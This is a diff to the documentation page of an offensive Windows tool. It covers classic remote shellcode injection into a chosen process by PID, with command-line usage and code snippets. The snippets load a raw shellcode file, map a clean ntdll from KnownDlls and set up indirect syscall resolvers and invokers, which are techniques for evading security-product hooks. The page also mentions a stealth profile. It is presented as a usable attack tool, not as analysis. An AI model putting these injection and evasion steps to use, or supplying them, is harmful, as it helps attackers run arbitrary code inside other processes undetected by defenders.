@@ -1,6 +1,7 @@
-# PoC: inject_shell
+# Example: Classic shellcode injection
 
-**Location:** `pocs/inject_shell/`
+**Command implementation:** `pocs/src/cmd_inject_classic.c`
+**Invocation:** `unified inject classic shell ...`
 
 Classic remote shellcode injection into a target process. Reads raw bytes from disk and runs the full **Alloc → Write → Protect → Execute** pipeline via `snd_inj_classic_shell`.
 
@@ -9,12 +10,12 @@ Classic remote shellcode injection into a target process. Reads raw bytes from d
 - Shared injection context (`snd_inj_ctx_t`) with `snd_inj_classic_shell`
 - KnownDlls bootstrap + syscall pipeline setup (present in source)
 - Win32 remote process API (`snd_proc_win`) for cross-process operations
-- Disk payload loading with `snd_disk_buffer_load`
+- Win32 payload loading with `snd_file_win.load`
 
 ## Command-line usage
 
 ```text
-inject_shell -f <payload_path> -p <target_pid>
+unified inject classic shell -f <payload_path> -p <target_pid> --win
 
   -f   Path to raw shellcode file
   -p   Target process ID (decimal)
@@ -23,7 +24,7 @@ inject_shell -f <payload_path> -p <target_pid>
 ### Example
 
 ```bash
-inject_shell.exe -f shellcode.bin -p 1234
+unified.exe inject classic shell -f shellcode.bin -p 1234 --win
 ```
 
 The remote thread starts at the allocation base — the entire file contents are treated as executable shellcode.
@@ -36,7 +37,7 @@ The remote thread starts at the allocation base — the entire file contents are
 snd_buffer_t  inject_buf = {0};
 snd_inj_ctx_t inj_ctx    = {0};
 
-status = snd_disk_buffer_load(file_path, &inject_buf);
+status = snd_file_win.load(file_path, &inject_buf);
 ```
 
 ### 2. Bootstrap syscall pipeline (optional for current profile)
@@ -45,7 +46,7 @@ status = snd_disk_buffer_load(file_path, &inject_buf);
 PVOID ntdll = NULL;
 status = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
 
-snd_syscall_set_ntdll(ntdll);
+snd_ntdll_set_clean(ntdll);
 snd_syscall_set_resolver(snd_syscall_resolve_ssn_scan);
 snd_syscall_add_resolver(snd_syscall_resolve_ssn_sort);
 snd_syscall_set_invoker(snd_syscall_indirect_invoke_asm);
@@ -101,5 +102,5 @@ For a stealth shellcode profile, keep the KnownDlls bootstrap and set `inj_ctx.p
 
 ## See also
 
-- [Injection techniques](../domains/injection/techniques.md)
+- [Injection techniques](../injection/internals.md)
 - [inject_pe.md](inject_pe.md) — PE payload with full `_sys` profile
